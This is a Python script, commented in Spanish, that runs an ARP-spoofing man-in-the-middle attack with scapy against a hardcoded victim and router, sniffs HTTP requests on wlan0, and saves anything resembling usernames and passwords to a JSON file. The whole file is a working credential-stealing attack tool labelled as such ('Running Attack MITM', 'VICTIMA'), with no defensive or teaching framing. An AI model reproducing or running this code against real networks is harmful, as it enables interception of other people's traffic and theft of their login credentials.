import os
import argparse
from scapy.all import *
from scapy_http import http
import json

# DEFINICION DE LISTAS Y VARIABLES
# lista se utilizara para capturar patrones por un sniffer para poder identificar una posible contraseña

wordlist = ["username", "user", "userid", "usuario", "password", "pas"]


#UNCION QUE CAPTURA EL TRAFICO HTTP

def capture_http(pkt):
    if pkt.haslayer(http.HTTPRequest): #Evalua si existe una solicitud de paquete http
        print(("VICTIMA: " + pkt[IP].src #Muestra la direccion Ip de origen del paquete
               + " DESTINO: " + pkt[IP].dst #Muestra la direccion Ip destino del paquete
               + " DOMINIO: " + str(pkt[http.HTTPRequest].Host))) #
        if pkt.haslayer(Raw):
            try:
                data = (pkt[Raw]
                        .load
                        .lower()
                        .decode('utf-8'))
            except:
                return None            
            for word in wordlist:
                if word in data:
                    #print("El tipo de dato para data es:\n", type(data))
                    dataFormat = data.split("&")
                    userandpassword= dataFormat[:2]
                    #print ("POSIBLE USUARIO O PASSWORD: ", userandpassword)
                    print ("POSIBLE USUARIO O PASSWORD: " + data)
                    with open('captura_usuario_password.json', 'w') as archivo_paquetes:
                        json.dump(userandpassword, archivo_paquetes, indent=4)
                        archivo_paquetes. close ()
                        print ("****** Los paquetes fueron guardados en el archivo JSON : CAPTURA_USUARIO_PASSWORD *******")



# define una funcion que optiene la mac addres de una interfaz


def get_mac(ip):
    ip_layer = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff :ff:ff:ff")
    final_packet = broadcast / ip_layer
    answer = srp(final_packet, timeout=2, verbose=False) [0]
    mac = answer[0][1].hwsrc
    return mac



# DEFINE UNA FUNCION PARA EL ATAQUE MITH DE TIPO ARP


def spoofer (target, spoofed) :
    mac = get_mac (target)
    #print ("MAC:", mac)
    spoofer_mac = ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    send(spoofer_mac, verbose=False)



# SE DEFINE LA FUNCION PRINCIPAL


print ("****Running Attack MITM****")
while True:
    spoofer("192.168.0.13", "192.168.0.1") #ip victima e Ipr outer
    spoofer("192.168.0.1", "192.168.0.13") #ip router e Ip victima
    print("****Sniffing Password Active -- Paquetes Capturados****")
    sniff(iface="wlan0",
    store=False,
    prn=capture_http) #Nombre del grupo de red